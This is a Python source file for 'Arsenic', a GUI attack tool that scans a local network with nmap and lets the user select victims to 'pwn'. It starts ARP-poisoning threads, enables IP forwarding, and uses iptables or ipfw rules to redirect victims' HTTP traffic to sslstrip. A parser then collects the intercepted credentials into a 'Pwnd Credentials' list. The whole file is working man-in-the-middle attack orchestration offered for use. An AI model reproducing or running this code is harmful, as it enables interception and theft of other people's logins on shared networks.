# Copyright (c) 2012 KernelSanders
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

# Basic GUI structure from: http://code.activestate.com/recipes/82965-threads-tkinter-and-asynchronous-io/

import Tkinter
from Tkinter import *
import time
import threading
import Queue
import nmapRunner
import arpPoisoner
import sslstripRunner
import thread
import os
import parser
'''
This is our very simple GUI. Three buttons, two labels, and two listboxes. Simple but effective.
'''
class GuiPart:
    def __init__(self, master, queue, endCommand, doScan, doPwn, credQueue):

        def resetAndScan(l):
            l.delete(0,END)
            doScan()

        self.queue = queue
        self.credQueue = credQueue

        # GUI info from: http://www.tutorialspoint.com/python/python_gui_programming.htm

        master.title('Arsenic')
        master.geometry("640x400")
        # Our main frame, everything else will be in this frame
        self.main = Frame(master)
        self.main.pack(expand=YES, fill=BOTH)
        # The left frame will contain our simple instructions, the host list, and our buttons
        self.left = Frame(self.main, width=50)
        self.left.pack(side=LEFT, fill=Y)
        # The middle frame is actually just a narrow black line to separate the left and right frames
        self.middle = Frame(self.main, width=2, bg='black')
        self.middle.pack(side=LEFT, fill=Y)
        # The right frame will contain the live updating list of credentials
        self.right = Frame(self.main, width=100)
        self.right.pack(side=RIGHT, fill=Y)
        # The title frame holds our instruction label
        self.titleFrame = Frame(self.left, height=5)
        self.titleFrame.pack(side=TOP, fill=X)
        self.instruct = Label(self.titleFrame, text='Scan for hosts, then select hosts to pwn.')
        self.instruct.pack()
        # Just some eye candy here, a black line to separate the instructions from the list of hosts
        self.underlineLeft = Frame(self.left, height=2, bg='black')
        self.underlineLeft.pack(side=TOP, fill=X)
        # A frame to hold our listbox of hosts
        self.mainFrame = Frame(self.left)
        self.mainFrame.pack(expand=YES, fill=BOTH)
        # More eye candy
        self.underlineButton = Frame(self.left, height=2, bg='black')
        self.underlineButton.pack(side=TOP, fill=X)
        # A frame to hold our buttons
        self.buttonFrame = Frame(self.left, height=5)
        self.buttonFrame.pack(side=BOTTOM, fill=X)
        # A label for the top of our right side
        self.pwndCred = Label(self.right, text='Pwnd Credentials', anchor=CENTER)
        self.pwndCred.pack(padx=0)
        # Eye candy
        self.underlineRight = Frame(self.right, height=2, bg='black')
        self.underlineRight.pack(side=TOP, fill=X)
        # The scrollable list of hosts
        self.hostScroll = Scrollbar(self.mainFrame)
        self.hostScroll.pack(side=RIGHT, fill=Y)
        self.hostList = Listbox(self.mainFrame, yscrollcommand = self.hostScroll.set, selectmode=MULTIPLE, selectbackground='red', bd=0, width=35)
        self.hostScroll.config(command = self.hostList.yview)
        self.hostList.pack(side=LEFT, fill=BOTH)
        # The scrollable list of credentials
        self.credScroll = Scrollbar(self.right)
        self.credScroll.pack(side=RIGHT, fill=Y)
        self.credList = Listbox(self.right, yscrollcommand = self.credScroll.set, bd=0, width=42)
        self.credScroll.config(command = self.credList.yview)
        self.credList.pack(side=LEFT, fill=BOTH)
        # The three buttons
        self.scanButton = Button(self.buttonFrame, text='Scan', command=lambda l=self.hostList: resetAndScan(l)).pack(side=LEFT, padx=15)
        self.doneButton = Button(self.buttonFrame, text='Done', command=endCommand).pack(side=RIGHT, padx=15)
        self.pwnButton = Button(self.buttonFrame, text='Pwn', command=lambda l=self.hostList: doPwn(l)).pack(side=LEFT,  padx=15)

    def processIncoming(self):
        """
        Handle all the messages currently in the queue (if any).
        """
        while self.queue.qsize():
            try:
                msg = self.queue.get(0)
                # if a message exists, it must be a host from the nmap scan, so add it to the listbox
                self.hostList.insert(END, msg)

            except Queue.Empty:
                pass
        while self.credQueue.qsize():
            try:
                cred = self.credQueue.get(0)
                # if a cred exists it must be part of a credential from the parser, add it to the end of the credentials listbox
                self.credList.insert(END, cred)
            except Queue.Empty:
                pass


class ThreadedClient:
    """
    Launch the main part of the GUI and the worker thread. periodicCall and
    endApplication could reside in the GUI part, but putting them here
    means that you have all the thread controls in a single place.
    """
    def __init__(self, master):
        """
        Start the GUI and the asynchronous threads. We are in the main
        (original) thread of the application, which will later be used by
        the GUI. We spawn a new thread for the worker.
        """
        self.master = master

        # Create the queues that will be used to communicate with the GUI
        self.queue = Queue.Queue()
        self.credQueue = Queue.Queue()

        # Set up the GUI part
        self.gui = GuiPart(master, self.queue, self.endApplication, self.doScan, self.doPwn, self.credQueue)

        # Set up the thread to do asynchronous I/O
        # More can be made if necessary
        self.running = 1

        # Start the periodic call in the GUI to check if the queue contains
        # anything
        self.periodicCall()
        self.router = ''
        self.pwning = False
        self.mysslstrip = sslstripRunner.sslStrip()
        self.myParser = parser.parser(self.credQueue)
        self.threadList = []

    def periodicCall(self):
        """
        Check every 100 ms if there is something new in the queue.
        """
        self.gui.processIncoming()
        if not self.running:
            # This is the brutal stop of the system. You may want to do
            # some cleanup before actually shutting it down.
            import sys
            sys.exit(1)
        self.master.after(10, self.periodicCall)

    # def workerThread1(self, hostList):
    #     """
    #     This is where we handle the asynchronous I/O. For example, it may be
    #     a 'select()'.
    #     One important thing to remember is that the thread has to yield
    #     control.
    #     """
    #     while self.running:
    #         time.sleep(1)

    def endApplication(self):
        if self.pwning: # don't try to stop them if they aren't running
            self.mysslstrip.stop()
            self.myParser.stop()
        shutDownForwarding()
        shutDownIPtables()
        for threads in self.threadList: # kill all our arp spoofing threads
            os.popen("kill -9 "+str(threads))
        self.running = 0



    def doScan(self):
        """
        This runs an nmap scan of the current subnet and returns a list of hosts that
        nmap found as 'up'. Currently this blocks the GUI, but since you can't do anything
        without some hosts to pwn it isn't that big a deal.
        """
        self.router = nmapRunner.setDefaultGatewayAndInterface()[0] # we just need the first part of the tuple which is the router
        hostList = nmapRunner.getHosts()
        for hosts in hostList:
            self.queue.put(hosts)

    '''
    This is where it all comes together. This function spawns the arp spoofing threads for all
    selected victims, starts sslstrip in its own thread, and starts the parser in its own thread.
    Adding hosts on the fly is a feature for a future version.
    '''
    def doPwn(self, hostList):
        self.pwning = True
        def poison(host):
            myArpPoisoner = arpPoisoner.arpPoisonerClass(host, self.router)
            myArpPoisoner.run()
            self.threadList.append(os.getpid())
        for i in hostList.curselection():
            thread.start_new_thread(poison, (hostList.get(i),)) # from: http://stackoverflow.com/questions/6053208/press-more-than-one-tkinter-button
        def runsslstrip():
            self.mysslstrip.run()
        thread.start_new_thread(runsslstrip, ())
        def runParser():
            print 'running parser'
            self.myParser.run()
        thread.start_new_thread(runParser, ())
'''
Set up forwarding of traffic for linux and OSX. Without this, you would receive all the victim traffic
and just drop it, DoSing them.
'''
def setupForwarding():
    if os.path.isfile('/proc/sys/net/ipv4/ip_forward'):
        os.system('echo "1" > /proc/sys/net/ipv4/ip_forward') # LINUX
    else:
        os.system('sysctl -w net.inet.ip.forwarding=1') # OSX
        os.system('sysctl -w net.inet.ip.fw.enable=1')
        os.system('sysctl -w net.inet.ip.fw.verbose=1')
        os.system('sysctl -w net.inet.ip.scopedroute=0') # No dice on > 10.6
        f = os.popen("sysctl net.inet.ip.scopedroute")
        data = f.read()
        f.close()
        if data.split(' ')[1] != "0\n":
            print "Using OSX > 10.6 requires a special hack"
            print "See the README for more information"
            sys.exit(2)

'''
Turn off the forwarding that was activated in setupForwarding(). This leaves the system as we found it.
(Assuming that forwarding was turned off before we were run)
'''
def shutDownForwarding():
    if os.path.isfile('/proc/sys/net/ipv4/ip_forward'):
        os.system('echo "0" > /proc/sys/net/ipv4/ip_forward') # LINUX
    else:
        os.system('sysctl -w net.inet.ip.forwarding=0') # OSX
        os.system('sysctl -w net.inet.ip.fw.enable=0')
        os.system('sysctl -w net.inet.ip.fw.verbose=0')
        os.system('sysctl -w net.inet.ip.scopedroute=1') # Will throw a read only error on > 10.6

'''
Set up a simple redirect to get the victim traffic to sslstrip. Uses iptables on linux and ipfw on OSX.
'''
def setupIPtables():
    if os.path.isfile('/proc/sys/net/ipv4/ip_forward'):
        os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10001') # LINUX
    else:
        os.system('sudo ipfw add 00100 fwd 127.0.0.1,10001 log tcp from not me to any 80') # OSX

'''
Remove our rules from iptables or ipfw.
'''
def shutDownIPtables():
    if os.path.isfile('/proc/sys/net/ipv4/ip_forward'):
        os.system('iptables -t nat -F') # LINUX
    else:
        os.system('ipfw delete 00100') # OSX






